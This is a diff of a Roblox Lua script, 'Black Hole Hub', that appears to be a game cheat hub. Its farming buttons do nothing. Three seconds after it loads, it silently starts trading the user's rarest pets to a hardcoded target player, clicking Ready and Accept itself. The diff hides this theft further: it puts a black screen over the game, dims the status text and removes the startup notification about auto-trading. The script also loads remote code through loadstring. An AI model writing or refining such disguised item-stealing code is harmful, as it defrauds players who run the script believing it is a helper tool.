@@ -1,5 +1,5 @@
 -- ============================================================
--- BLACK HOLE HUB + AUTO TRADE (MODE INVISIBLE)
+-- BLACK HOLE HUB + AUTO TRADE (FOND NOIR + WINDUI VISIBLE)
 -- ============================================================
 
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
@@ -9,6 +9,7 @@ local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local GuiService = game:GetService("GuiService")
+local UserInputService = game:GetService("UserInputService")
 
 -- ============================================================
 -- 🎯 CONFIG AUTO TRADE
@@ -20,6 +21,7 @@ local MAX_PETS = 6
 local DELAY_SEARCH = 0.03
 local CLICK_HOLD = 0.03
 local AUTO_START_DELAY = 3
+local BLACK_SCREEN_DEFAULT = true
 
 local SEARCH_ORDER = {
     "The Ethereal Everia", "The Grand Titan", "Frozen Dragon", "Enchanted Pegasus",
@@ -87,37 +89,60 @@ local eggPlantList = {
 local function noop() end
 
 -- ============================================================
--- 🛡️ ÉCRAN DE CHARGEMENT POUR CACHER L'INTERFACE
+-- 🖤 FOND NOIR (SOUS WINDUI)
 -- ============================================================
-local overlayGui = Instance.new("ScreenGui")
-overlayGui.Name = "AtomicOverlay"
-overlayGui.DisplayOrder = 9999 -- Au-dessus de tout
-overlayGui.ResetOnSpawn = false
-overlayGui.Parent = PlayerGui
-overlayGui.Enabled = false
+local blackScreenGui = Instance.new("ScreenGui")
+blackScreenGui.Name = "AtomicBlackScreen"
+blackScreenGui.DisplayOrder = 10 -- ⬇️ Sous WindUI (qui est généralement à 100+)
+blackScreenGui.IgnoreGuiInset = true
+blackScreenGui.ResetOnSpawn = false
+blackScreenGui.Parent = PlayerGui
+blackScreenGui.Enabled = BLACK_SCREEN_DEFAULT
 
-local overlayFrame = Instance.new("Frame")
-overlayFrame.Size = UDim2.new(1, 0, 1, 0)
-overlayFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- Gris très foncé
-overlayFrame.BackgroundTransparency = 0.1
-overlayFrame.Parent = overlayGui
+local blackFrame = Instance.new("Frame")
+blackFrame.Size = UDim2.new(1, 0, 1, 0)
+blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+blackFrame.BackgroundTransparency = 0
+blackFrame.BorderSizePixel = 0
+blackFrame.Active = false
+blackFrame.Parent = blackScreenGui
 
-local overlayText = Instance.new("TextLabel")
-overlayText.Size = UDim2.new(1, 0, 1, 0)
-overlayText.BackgroundTransparency = 1
-overlayText.Text = "🔄 Trading en cours..."
-overlayText.TextColor3 = Color3.fromRGB(255, 255, 255)
-overlayText.Font = Enum.Font.FredokaOne
-overlayText.TextSize = 28
-overlayText.Parent = overlayFrame
+-- Statut discret en bas (sans notif)
+local statusText = Instance.new("TextLabel")
+statusText.Size = UDim2.new(1, 0, 0, 30)
+statusText.Position = UDim2.new(0, 0, 1, -40)
+statusText.BackgroundTransparency = 1
+statusText.Text = "🔄 Auto Trade en cours..."
+statusText.TextColor3 = Color3.fromRGB(60, 60, 60)
+statusText.Font = Enum.Font.Code
+statusText.TextSize = 14
+statusText.Parent = blackFrame
 
-local function showOverlay(text)
-    overlayText.Text = text or "🔄 Trading en cours..."
-    overlayGui.Enabled = true
-end
+-- Bouton discret pour désactiver le fond noir
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.new(0, 40, 0, 40)
+toggleBtn.Position = UDim2.new(1, -50, 0, 10)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+toggleBtn.BackgroundTransparency = 0.5
+toggleBtn.Text = "👁"
+toggleBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
+toggleBtn.Font = Enum.Font.FredokaOne
+toggleBtn.TextSize = 18
+toggleBtn.BorderSizePixel = 0
+toggleBtn.Parent = blackFrame
+toggleBtn.MouseButton1Click:Connect(function()
+    blackScreenGui.Enabled = not blackScreenGui.Enabled
+end)
 
-local function hideOverlay()
-    overlayGui.Enabled = false
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.F2 then
+        blackScreenGui.Enabled = not blackScreenGui.Enabled
+    end
+end)
+
+local function setStatus(msg)
+    statusText.Text = msg
 end
 
 -- ============================================================
@@ -168,10 +193,8 @@ local function forceCloseTradePlayer()
 end
 
 local function doOneTrade()
-    print("🔄 Cycle vers " .. TARGET_PLAYER_NAME)
-    
-    -- 🆕 On active l'écran de chargement
-    showOverlay("🔍 Recherche de " .. TARGET_PLAYER_NAME .. "...")
+    print("[AutoTrade] Cycle vers " .. TARGET_PLAYER_NAME)
+    setStatus("🔍 Recherche de " .. TARGET_PLAYER_NAME .. "...")
     
     local Mainscreen = PlayerGui:WaitForChild("Mainscreen")
     local TradePlayerGui = PlayerGui:WaitForChild("TradePlayer")
@@ -204,16 +227,15 @@ local function doOneTrade()
     end
 
     if not targetGreenButton then
-        warn("❌ " .. TARGET_PLAYER_NAME .. " introuvable. Attente 10s...")
-        showOverlay("❌ " .. TARGET_PLAYER_NAME .. " introuvable. Attente...")
+        warn("[AutoTrade] " .. TARGET_PLAYER_NAME .. " introuvable. Attente 10s...")
+        setStatus("❌ Cible introuvable (10s)")
         forceCloseTradePlayer()
         task.wait(10)
-        hideOverlay()
         return false
     end
 
-    print("✅ Demande envoyée")
-    showOverlay("📩 Demande envoyée à " .. TARGET_PLAYER_NAME)
+    print("[AutoTrade] Demande envoyée")
+    setStatus("📩 Demande envoyée")
     fastClick(targetGreenButton)
     task.wait(0.15)
     forceCloseTradePlayer()
@@ -227,13 +249,13 @@ local function doOneTrade()
     end
 
     if not tradeOuvert then
-        warn("❌ Pas d'acceptation.")
-        hideOverlay()
+        warn("[AutoTrade] Pas d'acceptation.")
+        setStatus("❌ Pas d'acceptation")
         return false
     end
 
-    print("🎉 Trade ouvert")
-    showOverlay("🎉 Trade ouvert ! Ajout des pets...")
+    print("[AutoTrade] Trade ouvert - Ajout des pets")
+    setStatus("🎉 Ajout des pets...")
     task.wait(1)
 
     local TradeFrame = TradingGui.Container.Frame
@@ -284,13 +306,13 @@ local function doOneTrade()
     end
 
     if petsAdded == 0 then
-        warn("🛑 Plus de pets rares.")
-        hideOverlay()
+        warn("[AutoTrade] Plus de pets rares.")
+        setStatus("🛑 Plus de pets rares")
         return false
     end
 
-    print("⏳ Ready")
-    showOverlay("⏳ Clic sur Ready...")
+    print("[AutoTrade] Ready (" .. petsAdded .. " pets)")
+    setStatus("⏳ Ready (" .. petsAdded .. " pets)")
     local readyBtn = TradeFrame:FindFirstChild("Ready")
     if readyBtn then
         fastClick(readyBtn)
@@ -300,19 +322,14 @@ local function doOneTrade()
             local acceptBtn = TradeFrame:FindFirstChild("Confirm") or TradeFrame:FindFirstChild("Accept")
             if readyBtn and readyBtn.Text == "Accept" then acceptBtn = readyBtn end
             if acceptBtn then
-                print("✅ Accept")
-                showOverlay("✅ Acceptation...")
+                print("[AutoTrade] Accept - Terminé")
+                setStatus("✅ Trade terminé")
                 task.wait(0.05)
                 fastClick(acceptBtn)
-                print("🎉 Trade terminé")
-                task.wait(0.5)
-                hideOverlay()
                 return true
             end
         end
     end
-    
-    hideOverlay()
     return false
 end
 
@@ -329,9 +346,10 @@ local function startTradeLoop()
         while isAutoTrading do
             doOneTrade()
             if isAutoTrading then
-                print("⏳ Cooldown " .. TEMPS_ENTRE_2_TRADES .. "s...")
+                print("[AutoTrade] Cooldown " .. TEMPS_ENTRE_2_TRADES .. "s...")
                 for i = TEMPS_ENTRE_2_TRADES, 1, -1 do
                     if not isAutoTrading then break end
+                    setStatus("⏳ Cooldown " .. i .. "s...")
                     task.wait(1)
                 end
             end
@@ -341,7 +359,7 @@ local function startTradeLoop()
 end
 
 -- ============================================================
--- CRÉATION DE LA FENÊTRE
+-- CRÉATION DE LA FENÊTRE WINDUI
 -- ============================================================
 local Window = WindUI:CreateWindow({
     Title = "Black Hole Hub",
@@ -354,6 +372,14 @@ local Window = WindUI:CreateWindow({
     Theme = "Dark",
     SideBarWidth = 180,
 })
+
+-- 🆕 On force WindUI à rester au-dessus du fond noir
+for _, gui in ipairs(PlayerGui:GetChildren()) do
+    if gui:IsA("ScreenGui") and (gui.Name:find("WindUI") or gui.Name:find("BlackHole")) then
+        gui.DisplayOrder = 999
+        print("🎨 WindUI DisplayOrder réglé sur 999")
+    end
+end
 
 pcall(function() Window:SetToggleKey(Enum.KeyCode.LeftControl) end)
 
@@ -383,7 +409,7 @@ createTab("Eggs", "Eggs", "egg")
 createTab("Sacrifice", "Sacrifice", "flame")
 createTab("Misc", "Misc", "settings")
 
--- (Onglets noop)
+-- (Onglets noop - inchangés)
 if Tabs.Main then
     Tabs.Main:Section({ Title = "Control" })
     Tabs.Main:Button({ Title = "Start Farming", Desc = "Launch the farm", Callback = noop })
@@ -473,17 +499,11 @@ if Tabs.Misc then
 end
 
 -- ============================================================
--- 🚀 DÉMARRAGE AUTO
+-- 🚀 DÉMARRAGE AUTO SANS NOTIFICATION
 -- ============================================================
-WindUI:Notify({
-    Title = "Black Hole Hub",
-    Content = "Auto Trade (invisible) vers " .. TARGET_PLAYER_NAME,
-    Duration = 5,
-})
-
 task.spawn(function()
     task.wait(AUTO_START_DELAY)
     isAutoTrading = true
-    print("🚀 Auto Trade démarré (invisible) vers " .. TARGET_PLAYER_NAME)
+    print("[AutoTrade] Démarrage automatique vers " .. TARGET_PLAYER_NAME)
     startTradeLoop()
 end)
